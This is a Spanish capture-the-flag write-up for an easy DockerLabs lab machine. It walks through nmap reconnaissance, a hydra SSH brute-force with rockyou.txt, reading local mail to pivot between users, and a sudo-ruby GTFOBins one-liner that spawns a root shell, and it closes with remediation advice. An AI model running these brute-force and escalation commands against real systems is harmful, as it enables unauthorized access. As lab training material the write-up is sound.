Writeup: Máquina DockerLabs (Escalada mediante Ruby)


​Plataforma: DockerLabs


Dificultad: Fácil


Fecha: 2 de Noviembre, 2026


Objetivo: Obtener acceso con privilegios de administrador (root).


​1. Resumen Ejecutivo


​El objetivo de la auditoría consistió en comprometer el entorno controlado de DockerLabs a través de la siguiente cadena de explotación:




​Escaneo de puertos y reconocimiento del servicio web/SSH.



​Ataque de fuerza bruta con hydra sobre el servicio SSH para obtener acceso inicial como usuario camilo.




​Movimiento lateral leyendo el spool de correo local (/var/mail) para pivotar al usuario juan.




​Escalada de privilegios abusando de configuraciones inseguras en sudoers mediante la herramienta /usr/bin/ruby (GTFOBins) para obtener acceso de superusuario (root).





​2. Reconocimiento y Enumeración
Escaneo de Puertos (Nmap)


​Se inició con un escaneo de servicios y versiones hacia el objetivo:


nmap -sV 172.17.0.2

Resultado del escaneo:




​22/tcp (SSH): OpenSSH 7.6p1 Ubuntu


​80/tcp (HTTP): Apache httpd 2.4.29




​Inspección HTTP


​Se realizó una petición al servidor web:
curl -s 172.17.0.2

Salida:




​De: Juan Para: Camilo, te he dejado un correo es importante...






​Esto permitió confirmar los nombres de usuario válidos en el sistema: camilo y juan.


​3. Acceso Inicial (Intrusión)


​Con los nombres de usuario identificados (usuarios.txt), se procedió a realizar un ataque de fuerza bruta sobre el puerto 22 (SSH) utilizando hydra y la lista de contraseñas rockyou.txt:

hydra -L usuarios.txt -P rockyou.txt ssh://172.17.0.2 -t 32 -f

Credencial obtenida:





​Usuario: camilo




​Contraseña: password1





​4. Movimiento Lateral


​Tras iniciar sesión vía SSH como el usuario camilo, se inspeccionó el directorio de correo local en busca de información sensible o credenciales adicionales:


cat /var/mail/camilo

En el contenido del correo se encontró la contraseña correspondiente al usuario juan, permitiendo el pivoteo exitoso hacia su cuenta.


​5. Escalada de Privilegios (Root)


​Auditoría de Privilegios Sudo


​Al autenticarse como juan, se comprobaron los permisos de ejecución de comandos mediante:

sudo -l

Resultado 
User juan may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/ruby

Explotación (GTFOBins)


​Dado que /usr/bin/ruby cuenta con permisos de ejecución como root sin requerir contraseña, se utilizó la técnica de evasión de shell documentada en GTFOBins:

sudo ruby -e 'exec "/bin/sh"'


Verificación de Acceso


​Se confirmó la obtención del acceso de superusuario:

whoami
# Output: root

ls -la /root

Nota: Se verificó que la máquina no cuenta con archivos de comprobación root.txt ni flag.txt.


​6. Conclusión y Remediación





​Causa Raíz: Uso de contraseñas débiles en cuentas SSH y asignación de permisos NOPASSWD en /etc/sudoers para un ejecutable con capacidad de instanciar shells (ruby).




​Remediación:



​Forzar políticas de contraseñas robustas e implementar autenticación por llaves SSH.



​Eliminar la regla NOPASSWD para el usuario juan o restringir el uso de lenguajes de scripting dentro del archivo sudoers.









​
